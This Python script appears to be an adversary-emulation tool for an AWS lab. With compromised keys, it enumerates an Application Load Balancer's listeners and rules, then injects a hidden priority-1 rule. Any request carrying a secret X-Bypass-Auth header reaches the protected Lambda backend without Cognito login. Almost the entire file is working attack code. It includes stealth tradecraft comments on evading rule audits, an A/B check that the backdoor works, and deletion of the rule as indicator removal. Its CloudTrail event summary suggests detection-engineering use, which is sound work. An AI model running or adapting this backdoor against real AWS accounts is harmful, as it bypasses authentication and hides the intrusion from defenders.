# FILE: attack.py
"""
ALB ELBv2 Listener Authentication Bypass - Automated Emulation Script (T1556)
3-step attack chain: enumerate ALB/listener/TG ARNs, inject priority-1 HTTP-header
bypass rule around authenticate-cognito default action, A/B verify backdoor.
"""
import sys
import time
import random
import uuid
import json

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import boto3
from botocore.exceptions import ClientError
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def _step(msg):  print(f"\n[*] {msg}")
def _ok(msg):    print(f"[+] {msg}")
def _err(msg):   print(f"[-] {msg}")

def op_delay(min_s=2, max_s=6):   time.sleep(random.uniform(min_s, max_s))
def phase_delay():                 time.sleep(random.uniform(5, 15))


def _find_alb_arn(elb_client, dns_name):
    """Enumerate all load balancers and return the ARN whose DNSName matches dns_name."""
    paginator = elb_client.get_paginator("describe_load_balancers")
    for page in paginator.paginate():
        for lb in page.get("LoadBalancers", []):
            lb_dns = lb.get("DNSName", "")
            # exact or suffix match (ALB DNS names may include trailing dot)
            if lb_dns.rstrip(".").lower() == dns_name.rstrip(".").lower():
                return lb["LoadBalancerArn"], lb_dns
    # fallback: substring match (handles dns_name without region suffix)
    for page in elb_client.get_paginator("describe_load_balancers").paginate():
        for lb in page.get("LoadBalancers", []):
            if dns_name.lower() in lb.get("DNSName", "").lower():
                return lb["LoadBalancerArn"], lb["DNSName"]
    return None, None


def _get_with_retry(url, headers, max_retries=3):
    """GET with retry on 502/504 (Lambda cold start)."""
    for attempt in range(max_retries):
        try:
            r = requests.get(
                url,
                headers=headers,
                verify=False,
                allow_redirects=False,
                timeout=15,
            )
            if r.status_code in (502, 504) and attempt < max_retries - 1:
                _err(f"HTTP {r.status_code} (possible Lambda cold start) -- retrying in 5 s")
                time.sleep(5)
                continue
            return r
        except requests.RequestException as exc:
            if attempt < max_retries - 1:
                _err(f"Request error: {exc} -- retrying in 5 s")
                time.sleep(5)
            else:
                raise
    return None  # unreachable but satisfies linters


def run(outputs: dict, region: str = "us-east-1") -> None:
    # ── Validate required outputs ────────────────────────────────────────────
    access_key_id     = outputs.get("access_key_id")
    secret_access_key = outputs.get("secret_access_key")
    dns_name          = outputs.get("dns_name")

    if not access_key_id:
        raise RuntimeError("Missing required Pulumi output: access_key_id")
    if not secret_access_key:
        raise RuntimeError("Missing required Pulumi output: secret_access_key")
    if not dns_name:
        raise RuntimeError("Missing required Pulumi output: dns_name")

    # ── Build victim boto3 session (phase_1_victim_key from credential_chain) ─
    victim_session = boto3.Session(
        aws_access_key_id=access_key_id,
        aws_secret_access_key=secret_access_key,
        region_name=region,
    )
    elb = victim_session.client("elbv2")  # boto3 service id is "elbv2", not "elasticloadbalancingv2"

    # Track cleanup state across all steps
    bypass_rule_arn  = None
    https_listener_arn = None
    bypass_token     = None

    print("\n" + "=" * 60)
    print("[*] Phase 1: ALB Listener Authentication Bypass (T1556)")
    print("=" * 60)

    # ────────────────────────────────────────────────────────────────────────
    # Step 1 -- Self-discover ALB / listener / target-group ARNs
    # Technique: enumerate Describe* burst from compromised DevOps service account.
    # The victim policy grants DescribeLoadBalancers, DescribeListeners,
    # DescribeTargetGroups, DescribeRules -- standard DevOps read access that
    # also gives an attacker everything needed to plan the rule injection.
    # ────────────────────────────────────────────────────────────────────────
    _step("Step 1: Enumerating ELB resources (Describe* calls)")

    # 1a -- Locate target ALB by DNS name from Pulumi outputs
    try:
        alb_arn, resolved_dns = _find_alb_arn(elb, dns_name)
    except ClientError as exc:
        raise RuntimeError(f"describe_load_balancers failed: {exc}")

    if not alb_arn:
        raise RuntimeError(
            f"Could not locate ALB with DNS name '{dns_name}' "
            f"-- verify the Pulumi stack exported dns_name correctly"
        )
    _ok(f"Target ALB ARN: {alb_arn}")
    _ok(f"ALB DNS name  : {resolved_dns}")

    op_delay(2, 5)

    # 1b -- Find the HTTPS:443 listener
    try:
        resp = elb.describe_listeners(LoadBalancerArn=alb_arn)
    except ClientError as exc:
        raise RuntimeError(f"describe_listeners failed: {exc}")

    for listener in resp.get("Listeners", []):
        if listener.get("Protocol") == "HTTPS" and listener.get("Port") == 443:
            https_listener_arn = listener["ListenerArn"]
            break

    if not https_listener_arn:
        raise RuntimeError("No HTTPS:443 listener found on target ALB")
    _ok(f"HTTPS listener ARN: {https_listener_arn}")

    op_delay(2, 5)

    # 1c -- Find the Lambda-type target group (the protected backend)
    try:
        resp = elb.describe_target_groups(LoadBalancerArn=alb_arn)
    except ClientError as exc:
        raise RuntimeError(f"describe_target_groups failed: {exc}")

    protected_tg_arn = None
    for tg in resp.get("TargetGroups", []):
        if tg.get("TargetType") == "lambda":
            protected_tg_arn = tg["TargetGroupArn"]
            break

    if not protected_tg_arn:
        raise RuntimeError("No Lambda-type target group found on target ALB")
    _ok(f"Protected Lambda TG ARN: {protected_tg_arn}")

    op_delay(2, 5)

    # 1d -- Enumerate existing listener rules; confirm authenticate-cognito default
    try:
        resp = elb.describe_rules(ListenerArn=https_listener_arn)
    except ClientError as exc:
        _err(f"describe_rules failed: {exc}")
        resp = {"Rules": []}

    existing_rules = resp.get("Rules", [])
    _ok(f"Enumerated {len(existing_rules)} listener rule(s)")
    for rule in existing_rules:
        priority    = rule.get("Priority", "default")
        action_types = [a.get("Type") for a in rule.get("Actions", [])]
        print(f"    rule priority={priority} actions={action_types}")

    # Verify authenticate-cognito is enforced on the default rule before injecting
    cognito_confirmed = False
    for rule in existing_rules:
        if rule.get("IsDefault"):
            action_types = [a.get("Type") for a in rule.get("Actions", [])]
            if "authenticate-cognito" in action_types:
                cognito_confirmed = True
                _ok("Pre-condition confirmed: default rule enforces authenticate-cognito")
            else:
                _err(f"Warning: default rule actions={action_types} -- authenticate-cognito not found")

    op_delay(2, 5)

    # ────────────────────────────────────────────────────────────────────────
    # Step 2 -- Inject priority-1 HTTP-header-conditioned bypass rule
    # Tradecraft note: a /path-pattern /* rule would be obvious in rule audits;
    # a custom HTTP header condition is stealthier because (a) the header name
    # looks like an internal health-check artifact and (b) normal users never
    # send it, so the backdoor is conditionally invisible in traffic analysis.
    # ────────────────────────────────────────────────────────────────────────
    _step("Step 2: Injecting priority-1 bypass rule (X-Bypass-Auth header condition)")

    bypass_token = str(uuid.uuid4())
    _ok(f"Generated bypass token (X-Bypass-Auth value): {bypass_token}")

    # Idempotency: if a stale priority-1 rule exists from a prior crashed run,
    # delete it before re-injecting so the emulation remains re-runnable.
    existing_p1 = next(
        (r for r in existing_rules if r.get("Priority") == "1"), None
    )
    if existing_p1:
        stale_arn = existing_p1["RuleArn"]
        _err(f"Priority-1 rule already exists (stale from prior run): {stale_arn} -- removing")
        try:
            elb.delete_rule(RuleArn=stale_arn)
            _ok(f"Deleted stale priority-1 rule: {stale_arn}")
        except ClientError as exc:
            _err(f"Could not delete stale rule: {exc}")
        op_delay(1, 2)

    try:
        resp = elb.create_rule(
            ListenerArn=https_listener_arn,
            Priority=1,
            Conditions=[
                {
                    "Field": "http-header",
                    "HttpHeaderConfig": {
                        "HttpHeaderName": "X-Bypass-Auth",
                        "Values": [bypass_token],
                    },
                }
            ],
            Actions=[
                {
                    "Type": "forward",
                    "TargetGroupArn": protected_tg_arn,
                }
            ],
        )
        created = resp.get("Rules", [])
        if not created:
            raise RuntimeError("create_rule returned an empty Rules list")
        bypass_rule_arn = created[0]["RuleArn"]
        _ok(f"Bypass rule injected. ARN: {bypass_rule_arn}")
        _ok("Rule: IF X-Bypass-Auth == <token> THEN forward to backend (no authenticate-cognito)")
    except ClientError as exc:
        code = exc.response["Error"]["Code"]
        # PriorityInUse after our cleanup attempt means the environment is inconsistent
        raise RuntimeError(f"create_rule failed ({code}): {exc}")

    # ALB listener-rule changes propagate to all LB nodes eventually-consistently
    # (seconds to tens of seconds). Without this wait the A/B test races the
    # propagation and the bypass request falls through to authenticate-cognito.
    _probe_url = f"https://{dns_name}/"
    _ok("Waiting up to 90s for the injected rule to take effect on all ALB nodes...")
    for _wait in range(18):
        time.sleep(5)
        probe = _get_with_retry(_probe_url, headers={"X-Bypass-Auth": bypass_token})
        if probe is not None and probe.status_code != 302:
            _ok(f"Rule live after ~{_wait * 5 + 5}s (bypass probe returned HTTP {probe.status_code})")
            break
    else:
        _err("Injected rule did not take effect within 90s -- A/B result may be a false negative")

    # ────────────────────────────────────────────────────────────────────────
    # Step 3 -- A/B verification: bypass vs. baseline
    # WITH the magic header -> expect HTTP 200 from the Lambda HR portal.
    # WITHOUT the header    -> expect HTTP 302 redirect to Cognito hosted UI.
    # Both together prove the injected rule is a conditional backdoor, not a
    # blanket misconfiguration that would disable auth for all users.
    # ────────────────────────────────────────────────────────────────────────
    _step("Step 3: A/B verification -- bypass vs. baseline")

    base_url = f"https://{dns_name}/"
    bypass_verified  = False
    baseline_verified = False

    # Test A: WITH magic header (bypass path -- expect 200)
    _step("Test A: request WITH X-Bypass-Auth header (bypass path; expect HTTP 200)")
    try:
        r = _get_with_retry(base_url, headers={"X-Bypass-Auth": bypass_token})
        if r.status_code == 200:
            bypass_verified = True
            _ok(f"BYPASS CONFIRMED: HTTP {r.status_code} -- reached protected backend without Cognito auth")
            try:
                _ok(f"Response body (first 300 chars): {r.text[:300]}")
            except Exception:
                pass
        else:
            _err(f"Unexpected status on bypass path: HTTP {r.status_code}")
            try:
                _err(f"Body: {r.text[:200]}")
            except Exception:
                pass
    except Exception as exc:
        _err(f"Bypass request failed: {exc}")

    op_delay(2, 5)

    # Test B: WITHOUT magic header (baseline -- expect 302 to Cognito)
    _step("Test B: request WITHOUT X-Bypass-Auth header (baseline; expect HTTP 302)")
    try:
        r = _get_with_retry(base_url, headers={})
        if r.status_code == 302:
            baseline_verified = True
            location = r.headers.get("Location", "(no Location header)")
            _ok(f"Baseline confirmed: HTTP {r.status_code} -- Cognito auth still enforced")
            _ok(f"Location header: {location}")
        elif r.status_code == 200:
            _err(
                f"Warning: baseline returned HTTP 200 without bypass header -- "
                f"authenticate-cognito may not be enforced or listener default changed"
            )
        else:
            _err(f"Baseline returned HTTP {r.status_code}")
    except Exception as exc:
        _err(f"Baseline request failed: {exc}")

    op_delay(2, 5)

    # ────────────────────────────────────────────────────────────────────────
    # Cleanup -- Delete the injected bypass rule (indicator removal)
    # Uses the same victim_boto3_session (it has elasticloadbalancing:DeleteRule).
    # ────────────────────────────────────────────────────────────────────────
    _step("Cleanup: removing injected priority-1 bypass rule (indicator removal)")

    if bypass_rule_arn:
        try:
            elb.delete_rule(RuleArn=bypass_rule_arn)
            _ok(f"Deleted bypass rule: {bypass_rule_arn}")
        except ClientError as exc:
            code = exc.response["Error"]["Code"]
            _err(f"delete_rule failed ({code}): {exc} -- manual cleanup required")

        # Sanity check: confirm rule is gone
        try:
            post_rules = elb.describe_rules(
                ListenerArn=https_listener_arn
            ).get("Rules", [])
            non_default = [r for r in post_rules if not r.get("IsDefault")]
            _ok(f"Post-cleanup non-default rule count: {len(non_default)}")
            still_present = [
                r["RuleArn"] for r in post_rules if r.get("RuleArn") == bypass_rule_arn
            ]
            if still_present:
                _err(f"Warning: bypass rule ARN still visible in describe_rules -- check manually")
            else:
                _ok("Bypass rule confirmed absent from listener")
        except ClientError as exc:
            _err(f"Post-cleanup describe_rules failed: {exc}")
    else:
        _err("No bypass_rule_arn recorded -- cleanup may be incomplete")

    # ── Summary ──────────────────────────────────────────────────────────────
    print("\n" + "=" * 60)
    print("[*] ATTACK CHAIN COMPLETE -- CloudTrail Event Summary")
    print("=" * 60)
    events_generated = [
        ("DescribeLoadBalancers  [Step 1]",
         "elasticloadbalancingv2 -- victim principal enumerated ALB ARNs"),
        ("DescribeListeners      [Step 1]",
         "elasticloadbalancingv2 -- victim principal enumerated HTTPS listeners"),
        ("DescribeTargetGroups   [Step 1]",
         "elasticloadbalancingv2 -- victim principal enumerated target groups"),
        ("DescribeRules          [Step 1]",
         "elasticloadbalancingv2 -- victim principal enumerated existing rules"),
        ("CreateRule (T1556)     [Step 2]",
         "injected priority-1 http-header bypass rule (no authenticate-cognito action)"),
        ("HTTP GET + 200         [Step 3]",
         "accessed protected Lambda backend without Cognito auth (bypass verified)"),
        ("HTTP GET + 302         [Step 3]",
         "baseline: unauthenticated request still redirected to Cognito hosted UI"),
        ("DeleteRule             [Cleanup]",
         "removed bypass rule from listener (indicator removal)"),
    ]
    for event, detail in events_generated:
        print(f"  [+] {event}: {detail}")
    print("-" * 60)
    print(f"  Bypass verified : {bypass_verified}")
    print(f"  Baseline held   : {baseline_verified}")
    if bypass_rule_arn:
        print(f"  Bypass rule ARN : {bypass_rule_arn} (deleted)")
    print("=" * 60)
